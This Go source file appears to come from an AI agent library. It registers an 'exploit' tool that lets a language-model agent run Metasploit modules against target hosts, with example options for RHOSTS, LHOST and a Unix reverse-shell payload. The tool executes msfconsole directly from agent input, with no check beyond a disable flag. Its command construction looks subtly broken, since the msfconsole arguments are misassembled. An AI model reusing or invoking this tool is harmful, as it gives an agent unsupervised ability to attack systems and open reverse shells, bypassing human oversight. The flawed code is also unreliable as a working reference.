package tools

import (
	"context"
	"encoding/json"
	"fmt"
	"os/exec"

	"github.com/Swarmind/libagent/internal/tools"
	"github.com/Swarmind/libagent/pkg/config"
	"github.com/tmc/langchaingo/llms"
)

var ExploitToolDefinition = llms.FunctionDefinition{
	Name:        "exploit",
	Description: "Executes Metasploit exploit against a target using provided module and options.",
	Parameters: map[string]any{
		"type": "object",
		"properties": map[string]any{
			"module": map[string]any{
				"type":        "string",
				"description": "Metasploit exploit module to use (e.g., 'exploit/module_name').",
			},
			"options": map[string]any{
				"type":        "object",
				"description": "Key-value pairs for Metasploit options (e.g., {'RHOSTS': '192.168.1.10', 'LHOST': '192.168.1.5', 'payload': 'cmd/unix/reverse'}).",
			},
		},
	},
}

type ExploitTool struct{}

type ExploitToolArgs struct {
	Module  string            `json:"module"`
	Options map[string]string `json:"options"`
}

func (s *ExploitTool) Call(ctx context.Context, input string) (string, error) {
	exploitArgs := ExploitToolArgs{}
	if err := json.Unmarshal([]byte(input), &exploitArgs); err != nil {
		return "", fmt.Errorf("failed to unmarshal JSON: %w", err)
	}

	// Execute 'use cmd/unix/reverse' before running the exploit
	cmdUse := []string{"msfconsole"}
	cmdUse = append(cmdUse, "use", "cmd/unix/reverse")
	outputUse, errUse := exec.Command("msfconsole", cmdUse...).CombinedOutput()
	if errUse != nil {
		return "", fmt.Errorf("failed to execute 'use cmd/unix/reverse': %w - output: %s", errUse, string(outputUse))
	}

	cmdExploit := []string{"msfconsole"}
	for key, value := range exploitArgs.Options {
		cmdExploit = append(cmdExploit, "-o", key+"="+value)
	}
	cmdExploit = append(cmdExploit, "use", exploitArgs.Module)
	cmdExploit = append(cmdExploit, "run")

	outputExploit, errExploit := exec.Command("msfconsole", cmdExploit...).CombinedOutput()
	if errExploit != nil {
		return "", fmt.Errorf("failed to execute msfconsole: %w - output: %s", errExploit, string(outputExploit))
	}

	fmt.Println("executed metasploit exploit query:", input)
	fmt.Println("result:", outputExploit)

	return string(outputExploit), nil
}

func init() {
	globalToolsRegistry = append(globalToolsRegistry, func(ctx context.Context, cfg config.Config) (*tools.ToolData, error) {
		if cfg.ExploitDisable {
			return nil, nil
		}

		tool := ExploitTool{}

		return &tools.ToolData{
			Definition: ExploitToolDefinition,
			Call:       tool.Call,
		}, nil
	})
}
